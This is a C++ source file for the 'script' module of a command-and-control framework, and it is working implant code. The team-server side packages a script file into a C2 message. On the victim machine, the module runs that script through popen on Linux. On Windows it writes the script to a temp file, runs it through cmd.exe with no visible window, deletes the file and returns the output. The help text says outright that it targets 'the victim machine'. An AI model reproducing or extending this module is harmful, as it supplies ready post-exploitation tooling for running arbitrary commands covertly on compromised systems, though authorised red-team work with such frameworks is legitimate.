#include "Script.hpp"

#include <array>
#include <chrono>
#include <cctype>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <string>
#include <thread>

#include "Common.hpp"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#endif

using namespace std;


constexpr std::string_view moduleName = "script";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Script* ScriptConstructor() 
{
    return new Script();
}

#else

__attribute__((visibility("default"))) Script * ScriptConstructor()
{
    return new Script();
}

#endif

namespace
{
    constexpr int ERROR_SCRIPT_EXECUTION = 1;
    constexpr int ERROR_UNSUPPORTED_SCRIPT_TYPE = 2;
    constexpr int ERROR_TEMP_SCRIPT_PATH = 3;
    constexpr int ERROR_TEMP_SCRIPT_WRITE = 4;
    constexpr int ERROR_CREATE_PIPE = 5;
    constexpr int ERROR_SET_HANDLE_INFO = 6;
    constexpr int ERROR_CREATE_PROCESS = 7;

#ifdef _WIN32
    bool hasWindowsScriptExtension(const std::string& path)
    {
        std::string extension = std::filesystem::path(path).extension().string();
        for (char& c : extension)
        {
            c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
        }
        return extension == ".bat" || extension == ".cmd";
    }

    std::string makeWindowsTempScriptPath(const std::string& inputFile)
    {
        char tempPathBuffer[MAX_PATH + 1] = {};
        DWORD tempPathLength = GetTempPathA(MAX_PATH, tempPathBuffer);
        if (tempPathLength == 0 || tempPathLength > MAX_PATH)
        {
            return {};
        }

        const std::string extension = std::filesystem::path(inputFile).extension().string();
        std::ostringstream name;
        name << "c2core_script_" << GetCurrentProcessId() << "_"
             << std::chrono::steady_clock::now().time_since_epoch().count()
             << "_"
             << std::hash<std::thread::id>{}(std::this_thread::get_id())
             << extension;

        std::filesystem::path tempPath(tempPathBuffer);
        tempPath /= name.str();
        return tempPath.string();
    }

    std::string runWindowsScriptFile(const std::string& scriptPath, int& errorCode)
    {
        std::string result;

        SECURITY_ATTRIBUTES securityAttributes;
        securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
        securityAttributes.bInheritHandle = TRUE;
        securityAttributes.lpSecurityDescriptor = nullptr;

        HANDLE pipeRead = nullptr;
        HANDLE pipeWrite = nullptr;
        if (!CreatePipe(&pipeRead, &pipeWrite, &securityAttributes, 0))
        {
            errorCode = ERROR_CREATE_PIPE;
            return "CreatePipe failed.";
        }
        if (!SetHandleInformation(pipeRead, HANDLE_FLAG_INHERIT, 0))
        {
            CloseHandle(pipeRead);
            CloseHandle(pipeWrite);
            errorCode = ERROR_SET_HANDLE_INFO;
            return "SetHandleInformation failed.";
        }

        STARTUPINFOA startupInfo;
        ZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags = STARTF_USESTDHANDLES;
        startupInfo.hStdOutput = pipeWrite;
        startupInfo.hStdError = pipeWrite;
        startupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        PROCESS_INFORMATION processInfo;
        ZeroMemory(&processInfo, sizeof(processInfo));

        char comspecBuffer[MAX_PATH + 1] = {};
        DWORD comspecLength = GetEnvironmentVariableA("ComSpec", comspecBuffer, MAX_PATH);
        std::string comspec = (comspecLength > 0 && comspecLength <= MAX_PATH)
            ? std::string(comspecBuffer, comspecLength)
            : "C:\\Windows\\System32\\cmd.exe";

        std::string commandLine = "\"" + comspec + "\" /Q /C \"\"" + scriptPath + "\"\"";
        std::vector<char> mutableCommandLine(commandLine.begin(), commandLine.end());
        mutableCommandLine.push_back('\0');

        BOOL created = CreateProcessA(
            nullptr,
            mutableCommandLine.data(),
            nullptr,
            nullptr,
            TRUE,
            CREATE_NO_WINDOW,
            nullptr,
            nullptr,
            &startupInfo,
            &processInfo);

        CloseHandle(pipeWrite);

        if (!created)
        {
            CloseHandle(pipeRead);
            errorCode = ERROR_CREATE_PROCESS;
            return "CreateProcess failed.";
        }

        std::array<char, 4096> buffer{};
        DWORD bytesRead = 0;
        while (ReadFile(pipeRead, buffer.data(), static_cast<DWORD>(buffer.size()), &bytesRead, nullptr) && bytesRead > 0)
        {
            result.append(buffer.data(), bytesRead);
        }

        WaitForSingleObject(processInfo.hProcess, INFINITE);
        CloseHandle(processInfo.hThread);
        CloseHandle(processInfo.hProcess);
        CloseHandle(pipeRead);

        return result;
    }
#endif
}


Script::Script()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Script::~Script()
{
}

std::string Script::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "script:\n";
    info += "Launch a TeamServer-managed script artifact on the victim machine.\n";
    info += "Scripts are resolved from Scripts/<platform> or Scripts/Any.\n";
    info += "exemple:\n";
    info += " - script collect.sh\n";
#endif
    return info;
}


int Script::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if(splitedCmd.size()<2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    string inputFile = splitedCmd[1];

    std::ifstream input(inputFile, std::ios::binary);

    if(input.good())
    {
        std::string buffer(std::istreambuf_iterator<char>(input), {});

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_inputfile(inputFile);
        c2Message.set_data(buffer.data(), buffer.size());
    }
    else
    {
        std::string err = "[-] Fail to open file: ";
        err+=inputFile;
        c2Message.set_returnvalue(err);
        return -1;
    }
#endif

    return 0;
}


int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const std::string script = c2Message.data();

    std::string result;
    int errorCode = 0;

#ifdef __linux__ 

    std::array<char, 128> buffer;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(script.c_str(), "r"), pclose);
    if (!pipe)
    {
        result = "popen() failed.";
        errorCode = ERROR_SCRIPT_EXECUTION;
    }
    else
    {
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
        {
            result += buffer.data();
        }
    }

#elif _WIN32

    if (!hasWindowsScriptExtension(c2Message.inputfile()))
    {
        result = "Unsupported script type on Windows. Use .bat or .cmd.";
        errorCode = ERROR_UNSUPPORTED_SCRIPT_TYPE;
    }
    else
    {
        const std::string tempScriptPath = makeWindowsTempScriptPath(c2Message.inputfile());
        if (tempScriptPath.empty())
        {
            result = "Failed to create temporary script path.";
            errorCode = ERROR_TEMP_SCRIPT_PATH;
        }
        else
        {
            {
                std::ofstream tempScript(tempScriptPath, std::ios::binary);
                tempScript.write(script.data(), static_cast<std::streamsize>(script.size()));
                if (!tempScript.good())
                {
                    result = "Failed to write temporary script.";
                    errorCode = ERROR_TEMP_SCRIPT_WRITE;
                }
            }

            if (errorCode == 0 && !std::filesystem::exists(tempScriptPath))
            {
                result = "Failed to write temporary script.";
                errorCode = ERROR_TEMP_SCRIPT_WRITE;
            }
            else if (errorCode == 0)
            {
                result = runWindowsScriptFile(tempScriptPath, errorCode);
                std::error_code ignored;
                std::filesystem::remove(tempScriptPath, ignored);
            }
        }
    }

#endif

    c2RetMessage.set_instruction(c2Message.instruction());
    if (errorCode > 0)
    {
        c2RetMessage.set_errorCode(errorCode);
    }
    c2RetMessage.set_returnvalue(result);

    return 0;
}

int Script::errorCodeToMsg(const C2Message &c2RetMessage, std::string &errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
    if (c2RetMessage.errorCode() > 0)
    {
        errorMsg = c2RetMessage.returnvalue();
    }
#endif
    return 0;
}
